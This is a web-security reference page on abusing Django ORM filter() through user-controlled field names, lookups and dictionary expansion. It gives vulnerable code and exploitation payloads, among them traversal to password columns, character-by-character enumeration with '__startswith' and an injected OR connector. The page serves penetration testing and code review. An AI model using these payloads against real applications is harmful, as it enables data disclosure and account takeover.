---
title: "Django filter() injection: lookup abuse and dictionary-expansion of request data"
description: Expanding attacker-controlled dictionaries into QuerySet.filter()/exclude() and trusting user-supplied field lookups exposes unintended columns and boolean logic.
keywords:
  - Django ORM
  - filter() injection
  - lookup injection
  - QueryDict expansion
  - exclude()
  - boolean logic injection
---

# Django filter() injection

Unlike `raw()`/`extra()`, `filter()` parameterizes **values**, so classic string-breakout SQL injection does not apply to the value side. The vulnerability class here is **lookup and field abuse**: when application code lets the request control *which field* or *which lookup* is queried—or expands an attacker-controlled dictionary straight into `filter(**data)`—the attacker reaches fields and boolean logic the developer never intended to expose.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable patterns

**Dictionary expansion of request data:**

```python
# data = request.GET.dict() or parsed JSON
User.objects.filter(**data)
```

**User-controlled field/lookup name:**

```python
field = request.GET["field"]          # e.g. "email"
User.objects.filter(**{f"{field}__icontains": term})
```

## Exploitation

**Relational traversal to other tables.** Django lookups follow `__` across foreign keys, so a controllable field name reaches related models:

```
field = profile__user__password        # traverse into a related sensitive column
field = groups__permissions__codename
```

**Lookup swapping** changes the comparison semantics—`__gt`, `__startswith`, `__regex`, `__isnull`—turning an equality check into an enumeration oracle:

```
?username__startswith=admin
?password__startswith=a            # confirm char-by-char via response differences
?is_superuser__isnull=false
```

**Boolean-logic injection via `_connector`.** When a dict is expanded into a `Q`-building helper, injecting connector keys flips AND into OR:

```json
{"username": "admin", "_connector": "OR", "is_superuser": "True"}
```

**Mass filter widening** (`exclude(**data)` / `get(**data)`) can be steered to return or act on records outside the intended scope, pairing with authorization gaps for account takeover or data disclosure.

The `__regex` / `__iregex` lookups additionally expose the backend regular-expression engine, which can be driven toward catastrophic backtracking.

## References

- [Django docs: Field lookups](https://docs.djangoproject.com/en/stable/ref/models/querysets/#field-lookups)
- [Django docs: Complex lookups with Q objects](https://docs.djangoproject.com/en/stable/topics/db/queries/#complex-lookups-with-q-objects)
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
